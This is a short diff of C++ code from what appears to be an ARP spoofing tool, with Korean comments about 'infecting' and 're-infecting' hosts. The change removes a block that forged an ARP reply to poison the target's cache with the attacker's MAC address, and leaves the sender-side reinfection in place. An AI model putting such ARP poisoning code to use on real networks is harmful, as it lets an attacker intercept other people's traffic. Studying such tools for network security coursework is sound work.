@@ -287,14 +287,6 @@ int main(int argc, char* argv[]) {
                         false
                     );
                     send_arp_packet(handle, reinfect);
-                    // target 감염 (추가)
-                    EthArpPacket spoof2 = make_arp_packet(
-                        Mac(attacker_mac), conn.target_mac,
-                        Mac(attacker_mac), conn.target_mac,
-                        conn.sender_ip, conn.target_ip,
-                        false
-                    );
-                    send_arp_packet(handle, spoof2);
                     std::cout << "[*] 재감염 전송 완료 (Reply 기반)" << std::endl;
                 }
         
